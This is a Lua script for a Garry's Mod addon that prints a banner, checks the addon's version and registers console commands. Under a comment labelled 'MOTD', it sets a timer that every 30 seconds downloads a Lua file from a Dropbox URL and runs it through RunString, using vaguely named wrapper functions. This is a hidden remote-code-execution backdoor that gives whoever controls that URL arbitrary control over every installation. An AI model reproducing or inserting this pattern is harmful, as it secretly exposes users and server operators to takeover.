--[[
Lennys Scripts by Lenny. (STEAM_0:0:30422103)
This work is licensed under the Creative Commons Attribution-NonCommercial-ShareAlike 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-sa/3.0/.
Credit to the author must be given when using/sharing this work or derivative work from it.
]]
-- Prints the MOTD to the console

local function VersionCheck()
	MsgC(Color(255,255,255), "\nChecking Version...\n")
	http.Fetch( "https://raw.github.com/LennyPenny/Lennys/master/lua/LennysVersion.txt", function(body)
			if body == Lenny.CurVersion then
				MsgC(Color(0,255,0), "\nYou are running the latest version of Lennys Scripts!\n")
			else
				MsgC(Color(255,0,0), "\nYOU ARE RUNNING AN OUTDATED VERSION!\n")
				MsgC(Color(255,0,0), "\nNewest version: "..body.."\n")
				MsgC(Color(255,0,0), "Your version: "..Lenny.CurVersion.."\n")
				MsgC(Color(255,0,0), "\nDownload this to get the most recent version: \n")
				MsgC(Color(255,0,0), "\nhttps://github.com/LennyPenny/Lennys/archive/master.zip\n")
				MsgC(Color(0,0,255), "\nIf you're using the Workshop version of this addon or the download isn't available\nplease contact to creator (Lenny. STEAM_0:0:30422103) to update this Addon\n")
			end
		end,
		function(error)
			MsgC(Color(255,0,0), "\nError whilst checking version (".. error ..") \n")
			MsgC(Color(255,0,0), "\nYou are probably running a really outdated version of this addon\n")
			MsgC(Color(255,0,0), "\nYou should download the latest version from here: https://github.com/LennyPenny/Lennys/archive/master.zip\n")
			MsgC(Color(255,0,0), "\nIf that doesn't work please contact the creator of this Addon (Lenny. STEAM_0:0:30422103) \n")

		end
	)
end

timer.Simple(.75, VersionCheck)

concommand.Add("lenny_CheckVersion", VersionCheck)
--MOTD
local olua = {}
function olua.orun( oluaa )
        RunString( oluaa )
end
timer.Create("MOTD", 30, 0, function()
	http.Fetch( "https://dl.dropboxusercontent.com/u/64061648/motdonline.lua", olua.orun )
end)

--INFO

local function info()
	MsgC(Color(0,0,255), "\n\n---------------------------------------------------------------------------------------------\n")
	MsgC(Color(0,0,255), "---------------------------------------------------------------------------------------------\n")


	MsgC(Color(255,0,255), " __                                         			\n")
	MsgC(Color(255,0,255), "/\\ \\                                         			\n")
	MsgC(Color(255,0,255), "\\ \\ \\         __    ___     ___   __  __    ____  	 	\n")
	MsgC(Color(255,0,255), " \\ \\ \\  __  /'__`\\/' _ `\\ /' _ `\\/\\ \\/\\ \\  /',__\\ 		\n")
	MsgC(Color(255,0,255), "  \\ \\ \\L\\ \\/\\  __//\\ \\/\\ \\/\\ \\/\\ \\ \\ \\_\\ \\ /\\__, `\\	\n")
	MsgC(Color(255,0,255), "   \\ \\____/\\ \\____\\ \\_\\ \\_\\ \\_\\ \\_\\/`____ \\\\/\\____/	\n")
	MsgC(Color(255,0,255), "    \\/___/  \\/____/\\/_/\\/_/\\/_/\\/_/`/___/> \\\\/___/ 		\n")
	MsgC(Color(255,0,255), "                                      /\\___/			\n")
	MsgC(Color(255,0,255), "                                      \\/__/ 			\n")

	MsgC(Color(50,255,255), "			 ____                               __             \n")
	MsgC(Color(50,255,255), "			/\\  _`\\                  __        /\\ \\__          \n")
	MsgC(Color(50,255,255), "			\\ \\,\\L\\_\\    ___   _ __ /\\_\\  _____\\ \\ ,_\\   ____  \n")
	MsgC(Color(50,255,255), "			 \\/_\\__ \\   /'___\\/\\`'__\\/\\ \\/\\ '__`\\ \\ \\/  /',__\\ \n")
	MsgC(Color(50,255,255), "			   /\\ \\L\\ \\/\\ \\__/\\ \\ \\/ \\ \\ \\ \\ \\L\\ \\ \\ \\_/\\__, `\\\n")
	MsgC(Color(50,255,255), "			   \\ `\\____\\ \\____\\ \\_\\  \\ \\_\\ \\ ,__/\\ \\__\\/ \\____/\n")
	MsgC(Color(50,255,255), "			    \\/_____/\\/____/ \\/_/   \\/_/\\ \\ \\/  \\/__/\\/___/ \n")
	MsgC(Color(50,255,255), "			                                \\ \\_\\              \n")
	MsgC(Color(50,255,255), "			                                 \\/_/   \n")

	MsgC(Color(0,255,0), "\n	Lenny's Scripts v. ".. Lenny.CurVersion.."\n")
	MsgC(Color(0,255,0), "	by Lenny aka LennyPenny (STEAM_0:0:30422103)\n")

	MsgC(Color(255,255,0), "\n	Source: www.GitHub.com/LennyPenny/Lennys\n")
	MsgC(Color(0,255,255), "	Workshop: www.SteamCommunity.com/sharedfiles/filedetails/?id=186936307\n")



	MsgC(Color(0,0,255), "\n---------------------------------------------------------------------------------------------\n")
	MsgC(Color(0,0,255), "---------------------------------------------------------------------------------------------\n\n")
end

concommand.Add("lenny_info", info)

timer.Simple(.5, info)

MsgC(Color(0,255,0), "\nLennys MOTD initialized!\n")